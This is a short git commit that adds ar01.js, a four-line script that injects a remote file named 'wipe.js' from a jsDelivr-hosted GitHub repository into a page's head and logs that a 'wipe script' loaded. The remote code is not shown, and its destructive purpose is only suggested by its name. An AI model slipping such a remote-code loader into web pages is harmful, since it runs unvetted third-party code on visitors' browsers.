3661a56fac7ae1de79abb409ee87ae3b0d565f5e
input <crackermrx96@gmail.com>
2026-03-12 17:07:18 +0100

    Create ar01.js

---
+++ ar01.js
@@ -0,0 +1,4 @@
+const script = document.createElement('script');
+script.src = "https://cdn.jsdelivr.net/gh/mrx1w1/a@main/wipe.js";
+script.onload = () => console.log('Wipe script loaded');
+document.head.appendChild(script);
